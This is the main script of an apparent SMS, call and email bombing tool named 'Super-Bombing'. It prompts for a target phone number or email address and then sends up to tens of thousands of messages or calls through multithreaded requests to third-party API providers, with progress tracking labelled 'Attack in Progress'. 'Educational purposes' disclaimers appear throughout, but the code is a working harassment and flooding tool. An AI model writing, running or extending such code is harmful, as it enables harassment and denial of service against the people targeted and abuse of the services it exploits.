#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

"""
Super-Bombing - Advanced SMS/CALL/MAIL Testing Tool
A sophisticated tool for testing API endpoints and communication systems
"""

import os
import sys
import time
import json
import argparse
import random
import string
import re
import shutil
import zipfile
import subprocess
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from colorama import Fore, Style, init as colorama_init
    colorama_init()  # Initialize colorama for Windows support
except ImportError:
    print("❌ Some dependencies are missing. Please install them using:")
    print("pip install -r requirements.txt")
    sys.exit(1)

# Local imports
from utils.provider import APIProvider

# Constants
VERSION = "2.0.0"
CONTRIBUTORS = ["Kai", "SpeedX"]
MAX_LIMITS = {
    "sms": 100000,
    "call": 50000, 
    "mail": 200000
}
SUPPORTED_MODES = ["sms", "call", "mail"]


class MessageDecorator:
    """Enhanced message decorator with colored output"""
    
    def __init__(self, style="icon"):
        self.style = style
        self.colors = {
            'success': Fore.GREEN,
            'error': Fore.RED,
            'warning': Fore.YELLOW,
            'info': Fore.CYAN,
            'section': Fore.MAGENTA,
            'command': Fore.BLUE,
            'reset': Style.RESET_ALL
        }
    
    def _print_message(self, message_type, message):
        """Internal method to print formatted messages"""
        icons = {
            'success': '✅',
            'error': '❌',
            'warning': '⚠️',
            'info': 'ℹ️',
            'section': '📁',
            'command': '⚡'
        }
        
        color = self.colors.get(message_type, '')
        icon = icons.get(message_type, '')
        
        if self.style == "icon":
            print(f"{color}{icon} {message}{self.colors['reset']}")
        else:
            print(f"{color}[{message_type.upper()}] {message}{self.colors['reset']}")
    
    def success(self, message):
        """Print success message"""
        self._print_message('success', message)
    
    def error(self, message):
        """Print error message"""
        self._print_message('error', message)
    
    def warning(self, message):
        """Print warning message"""
        self._print_message('warning', message)
    
    def info(self, message):
        """Print info message"""
        self._print_message('info', message)
    
    def section(self, message):
        """Print section header"""
        self._print_message('section', message)
    
    def command(self, message):
        """Print command message"""
        self._print_message('command', message)


class SuperBomber:
    """Main application class for Super-Bombing"""
    
    def __init__(self):
        self.mesgdcrt = MessageDecorator("icon")
        self.country_codes = {}
        self.ascii_mode = False
        self.debug_mode = False
        
    def initialize(self):
        """Initialize the application"""
        try:
            self.country_codes = self.read_isdcodes()
        except FileNotFoundError:
            self.update_tool()
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system("cls" if os.name == "nt" else "clear")
    
    def display_banner(self):
        """Display application banner"""
        self.clear_screen()
        
        if self.ascii_mode:
            banner = """
╔══════════════════════════════════════════════════╗
║                 SUPER-BOMBING                   ║
║              Advanced Testing Tool              ║
║                                                  ║
║    ███████╗██╗   ██╗██████╗ ███████╗██████╗     ║
║    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗    ║
║    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝    ║
║    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗    ║
║    ███████║╚██████╔╝██║     ███████╗██║  ██║    ║
║    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝    ║
║                                                  ║
╚══════════════════════════════════════════════════╝
            """
        else:
            banner = """
███████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ 
██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗   ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
███████╗██║   ██║██████╔╝█████╗  ██████╔╝   ██████╔╝██║   ██║██╔████╔██║██████╔╝
╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
███████║╚██████╔╝██║     ███████╗██║  ██║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝   ▚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
            """
        
        colors = [Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.YELLOW]
        print(random.choice(colors) + banner + Style.RESET_ALL)
        self.mesgdcrt.success(f"Version: {VERSION}")
        self.mesgdcrt.info(f"Contributors: {', '.join(CONTRIBUTORS)}")
        print()
    
    def read_isdcodes(self):
        """Read country codes from JSON file"""
        with open("isdcodes.json", "r", encoding="utf-8") as file:
            return json.load(file)["isdcodes"]
    
    def check_internet(self):
        """Check internet connectivity"""
        try:
            response = requests.get("https://api.github.com", timeout=10)
            return response.status_code == 200
        except requests.exceptions.RequestException:
            self.mesgdcrt.error("No internet connection detected!")
            return False
    
    def format_phone_number(self, number):
        """Format phone number by keeping only digits"""
        return ''.join(filter(str.isdigit, number))
    
    def update_tool(self):
        """Update the tool from repository"""
        self.mesgdcrt.warning("Updating Super-Bombing...")
        
        if shutil.which('git'):
            success = self.git_update()
        else:
            success = self.zip_update()
            
        if success:
            self.mesgdcrt.success("Update completed successfully!")
        else:
            self.mesgdcrt.error("Update failed!")
        
        return success
    
    def git_update(self):
        """Update using Git"""
        try:
            self.mesgdcrt.info("Using Git for update...")
            result = subprocess.run(
                ["git", "pull", "origin", "main"],
                capture_output=True,
                text=True,
                check=True
            )
            return result.returncode == 0
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False
    
    def zip_update(self):
        """Update by downloading ZIP"""
        try:
            self.mesgdcrt.info("Downloading update package...")
            zip_url = "https://github.com/Hackertrackersj/Tbomb/archive/refs/heads/main.zip"
            response = requests.get(zip_url, timeout=30)
            
            if response.status_code == 200:
                with zipfile.ZipFile(BytesIO(response.content)) as zip_file:
                    zip_file.extractall(".")
                return True
        except Exception as e:
            self.mesgdcrt.error(f"Update failed: {e}")
            
        return False
    
    def check_for_updates(self):
        """Check for available updates"""
        if self.debug_mode:
            self.mesgdcrt.warning("Debug mode enabled - Skipping update check")
            return
        
        self.mesgdcrt.info("Checking for updates...")
        
        try:
            latest_version = requests.get(
                "https://raw.githubusercontent.com/Hackertrackersj/Tbomb/main/.version",
                timeout=10
            ).text.strip()
            
            if latest_version != VERSION:
                self.mesgdcrt.warning(f"Update available: {latest_version}")
                if input("Update now? (y/N): ").lower() == 'y':
                    self.update_tool()
            else:
                self.mesgdcrt.success("Super-Bombing is up to date!")
                
        except requests.exceptions.RequestException:
            self.mesgdcrt.warning("Could not check for updates")
    
    def get_phone_info(self):
        """Get phone number information from user"""
        while True:
            try:
                # Country code
                cc = input("Enter country code (without +): ").strip()
                cc = self.format_phone_number(cc)
                
                if not self.country_codes.get(cc):
                    self.mesgdcrt.error(f"Invalid country code: {cc}")
                    continue
                
                # Phone number
                phone = input(f"Enter phone number (+{cc}): ").strip()
                phone = self.format_phone_number(phone)
                
                if len(phone) < 6 or len(phone) > 12:
                    self.mesgdcrt.error("Invalid phone number length")
                    continue
                
                return cc, phone
                
            except KeyboardInterrupt:
                raise
            except Exception as e:
                self.mesgdcrt.error(f"Error: {e}")
    
    def get_email_info(self):
        """Get email address from user"""
        email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        
        while True:
            try:
                email = input("Enter target email: ").strip().lower()
                
                if not re.match(email_regex, email):
                    self.mesgdcrt.error("Invalid email format")
                    continue
                    
                return email
                
            except KeyboardInterrupt:
                raise
    
    def get_attack_parameters(self, mode):
        """Get attack parameters from user"""
        limit = MAX_LIMITS.get(mode, 1000)
        
        while True:
            try:
                # Number of requests
                count = int(input(f"Number of {mode.upper()} to send (max {limit}): "))
                count = min(max(1, count), limit)
                
                # Delay between requests
                delay = float(input("Delay between requests (seconds): "))
                delay = max(0, delay)
                
                # Thread count
                max_threads = min(count // 10, 50)
                max_threads = max(1, max_threads)
                
                threads = int(input(f"Number of threads (recommended: {max_threads}): "))
                threads = min(max(1, threads), 100)
                
                return count, delay, threads
                
            except ValueError:
                self.mesgdcrt.error("Please enter valid numbers")
            except KeyboardInterrupt:
                raise
    
    def display_progress(self, cc, target, success, failed, total):
        """Display bombing progress"""
        self.clear_screen()
        self.mesgdcrt.section("Attack in Progress - Please wait...")
        
        progress_info = [
            f"Target: {cc + ' ' if cc else ''}{target}",
            f"Progress: {success + failed}/{total}",
            f"Successful: {success}",
            f"Failed: {failed}",
            f"Success Rate: {(success/(success+failed)*100 if success+failed > 0 else 0):.1f}%"
        ]
        
        for info in progress_info:
            self.mesgdcrt.info(info)
        
        # Progress bar
        if total > 0:
            percentage = (success + failed) / total
            bar_length = 40
            filled = int(bar_length * percentage)
            bar = "█" * filled + "░" * (bar_length - filled)
            print(f"\n[{bar}] {percentage:.1%}\n")
        
        self.mesgdcrt.warning("For educational and testing purposes only!")
    
    def execute_attack(self, mode, cc, target, count, delay, max_threads):
        """Execute the bombing attack"""
        api = APIProvider(cc, target, mode, delay=delay)
        
        # Display attack configuration
        self.clear_screen()
        self.mesgdcrt.section("Attack Configuration")
        config_info = [
            f"Mode: {mode.upper()}",
            f"Target: {cc + ' ' if cc else ''}{target}",
            f"Total Requests: {count}",
            f"Threads: {max_threads}",
            f"Delay: {delay} seconds"
        ]
        
        for info in config_info:
            self.mesgdcrt.info(info)
        
        self.mesgdcrt.warning("This tool is for educational purposes only!")
        print()
        
        if not hasattr(APIProvider, 'api_providers') or not APIProvider.api_providers:
            self.mesgdcrt.error("No API providers available for this target")
            return False
        
        # Confirm attack
        try:
            input("Press ENTER to start attack or CTRL+C to cancel: ")
        except KeyboardInterrupt:
            self.mesgdcrt.warning("Attack cancelled by user")
            return False
        
        # Execute attack
        success, failed = 0, 0
        start_time = time.time()
        
        try:
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                while success + failed < count:
                    remaining = count - (success + failed)
                    batch_size = min(remaining, max_threads * 2)
                    
                    futures = [executor.submit(api.hit) for _ in range(batch_size)]
                    
                    for future in as_completed(futures):
                        result = future.result()
                        
                        if result is None:
                            self.mesgdcrt.error("Rate limit reached for this target")
                            return True
                        
                        if result:
                            success += 1
                        else:
                            failed += 1
                        
                        self.display_progress(cc, target, success, failed, count)
                        
                        # Add delay between requests
                        if delay > 0:
                            time.sleep(delay)
            
            # Display final results
            end_time = time.time()
            total_time = end_time - start_time
            
            self.clear_screen()
            self.mesgdcrt.section("Attack Completed!")
            self.mesgdcrt.success(f"Total Requests: {count}")
            self.mesgdcrt.success(f"Successful: {success}")
            self.mesgdcrt.error(f"Failed: {failed}")
            self.mesgdcrt.info(f"Success Rate: {(success/count)*100:.1f}%")
            self.mesgdcrt.info(f"Time Taken: {total_time:.2f} seconds")
            self.mesgdcrt.info(f"Requests/Second: {count/total_time:.2f}")
            
            return True
            
        except Exception as e:
            self.mesgdcrt.error(f"Attack failed: {e}")
            return False
    
    def run_sms_mode(self):
        """Run SMS bombing mode"""
        self.mesgdcrt.section("SMS Bombing Mode")
        cc, target = self.get_phone_info()
        count, delay, threads = self.get_attack_parameters("sms")
        self.execute_attack("sms", cc, target, count, delay, threads)
    
    def run_call_mode(self):
        """Run call bombing mode"""
        self.mesgdcrt.section("Call Bombing Mode")
        cc, target = self.get_phone_info()
        count, delay, threads = self.get_attack_parameters("call")
        self.execute_attack("call", cc, target, count, delay, threads)
    
    def run_mail_mode(self):
        """Run mail bombing mode"""
        self.mesgdcrt.section("Email Bombing Mode")
        target = self.get_email_info()
        count, delay, threads = self.get_attack_parameters("mail")
        self.execute_attack("mail", "", target, count, delay, threads)
    
    def show_interactive_menu(self):
        """Show interactive mode selection menu"""
        menu_options = {
            "1": ("SMS Bombing", self.run_sms_mode),
            "2": ("Call Bombing", self.run_call_mode),
            "3": ("Email Bombing", self.run_mail_mode),
            "4": ("Check Updates", self.check_for_updates),
            "5": ("About", self.show_about),
            "0": ("Exit", sys.exit)
        }
        
        while True:
            self.clear_screen()
            self.display_banner()
            
            self.mesgdcrt.section("Main Menu")
            for key, (description, _) in menu_options.items():
                print(f"  [{key}] {description}")
            
            print()
            try:
                choice = input("Select an option: ").strip()
                
                if choice in menu_options:
                    try:
                        menu_options[choice][1]()
                    except KeyboardInterrupt:
                        self.mesgdcrt.warning("Operation cancelled by user")
                    except Exception as e:
                        self.mesgdcrt.error(f"Error: {e}")
                    
                    if choice != "0":
                        input("\nPress ENTER to continue...")
                else:
                    self.mesgdcrt.error("Invalid option!")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                self.mesgdcrt.warning("Exiting...")
                break
    
    def show_about(self):
        """Show about information"""
        self.clear_screen()
        self.display_banner()
        
        about_text = """
Super-Bombing - Advanced Testing Tool

Description:
A sophisticated tool designed for security researchers, 
developers, and educators to test API endpoints, 
communication systems, and spam detection mechanisms.

Features:
• Multi-mode testing (SMS, Call, Email)
• Configurable delays and threading
• Progress monitoring and statistics
• Cross-platform compatibility

Legal Notice:
This tool is intended for:
- Educational purposes
- Security research
- Testing your own systems
- Authorized penetration testing

Misuse of this tool for harassment, spam, or any 
illegal activities is strictly prohibited.

The developers are not responsible for any misuse 
or damage caused by this tool.
        """
        
        print(about_text)
        input("\nPress ENTER to return to main menu...")


def main():
    """Main application entry point"""
    parser = argparse.ArgumentParser(
        description="Super-Bombing - Advanced Communication Testing Tool",
        epilog="Use responsibly and legally!"
    )
    
    parser.add_argument("-sms", "--sms", action="store_true", help="SMS bombing mode")
    parser.add_argument("-call", "--call", action="store_true", help="Call bombing mode")
    parser.add_argument("-mail", "--mail", action="store_true", help="Email bombing mode")
    parser.add_argument("-ascii", "--ascii", action="store_true", help="ASCII-only display")
    parser.add_argument("-update", "--update", action="store_true", help="Update tool")
    parser.add_argument("-v", "--version", action="store_true", help="Show version")
    parser.add_argument("-debug", "--debug", action="store_true", help="Debug mode")
    
    args = parser.parse_args()
    
    # Create and configure bomber instance
    bomber = SuperBomber()
    bomber.ascii_mode = args.ascii
    bomber.debug_mode = args.debug
    
    try:
        bomber.initialize()
    except Exception as e:
        print(f"Initialization error: {e}")
        return
    
    # Handle command line arguments
    if args.version:
        print(f"Super-Bombing v{VERSION}")
        return
    
    if args.update:
        bomber.update_tool()
        return
    
    if not bomber.check_internet():
        return
    
    # Display banner
    bomber.display_banner()
    
    # Check for updates on startup
    bomber.check_for_updates()
    
    # Execute based on arguments
    try:
        if args.sms:
            bomber.run_sms_mode()
        elif args.call:
            bomber.run_call_mode()
        elif args.mail:
            bomber.run_mail_mode()
        else:
            bomber.show_interactive_menu()
    except KeyboardInterrupt:
        bomber.mesgdcrt.warning("Operation cancelled by user")
    except Exception as e:
        bomber.mesgdcrt.error(f"Unexpected error: {e}")


if __name__ == "__main__":
    main()